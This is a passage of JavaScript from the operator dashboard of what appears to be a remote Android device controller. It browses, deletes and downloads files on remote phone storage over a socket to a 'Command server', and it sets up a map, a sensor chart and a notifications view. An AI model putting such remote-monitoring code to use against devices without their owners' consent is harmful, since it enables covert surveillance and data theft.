    dev.currentPath = data.file_list.currentPath;
    if (selectedDeviceId === deviceId) {
      renderFileList(dev.files, dev.currentPath);
    }
  }
});

socket.on('fs:delete_result', (data) => {
  const deviceId = data.from || selectedDeviceId;
  logDebug(`[FS] Delete ${data.success ? 'SUCCESS' : 'FAILED'} for path ${data.path}`);
  if (selectedDeviceId === deviceId) {
    const dev = devices.get(deviceId);
    requestFileList(dev?.currentPath || '/storage/emulated/0/', deviceId);
  }
});

// Chunked File Downloads
socket.on('fs:download_start', (data) => {
  const { fileId, name, size, totalChunks } = data;
  logDebug(`[FS] Starting download: ${name} (${formatBytes(size)})`);
  activeDownloads[fileId] = {
    name: name,
    buffer: new Array(totalChunks),
    totalChunks: totalChunks,
    receivedChunks: 0,
    startTime: Date.now()
  };
  updateStatus(`Downloading ${name} (0%)`);
});

socket.on('fs:download_chunk', (data) => {
  const { fileId, chunkIndex, content } = data;
  const download = activeDownloads[fileId];
  if (download) {
    if (!download.buffer[chunkIndex]) {
      download.buffer[chunkIndex] = content;
      download.receivedChunks++;
    }
    const pct = Math.floor((download.receivedChunks / download.totalChunks) * 100);
    if (pct % 10 === 0) updateStatus(`Downloading ${download.name} (${pct}%)`);
  }
});

socket.on('fs:download_complete', (data) => {
  const { fileId } = data;
  const download = activeDownloads[fileId];
  if (download) {
    const base64Complete = download.buffer.join('');
    downloadBase64File(base64Complete, download.name);
    const duration = ((Date.now() - download.startTime) / 1000).toFixed(1);
    updateStatus(`Completed ${download.name} in ${duration}s`);
    delete activeDownloads[fileId];
  }
});

socket.on('fs:download_error', (data) => {
  const { fileId, error } = data;
  if (activeDownloads[fileId]) {
    updateStatus(`Download error: ${activeDownloads[fileId].name}`);
    delete activeDownloads[fileId];
  }
  logDebug(`[FS] Download fail: ${error}`);
});

socket.on('error', (error) => {
  updateStatus(`Signal Error: ${error.message || error}`);
});

retryButton?.addEventListener('click', () => {
  updateStatus('Reconnecting to Command server...');
  socket.connect();
});

// ─────────────────────────────────────────────────────────────
// Initial Startup
// ─────────────────────────────────────────────────────────────

updateStatus('Connecting to Command server...');
initMap();
initSensorChart();
switchTab(tabNotifications, paneNotifications);
renderDevicesList();
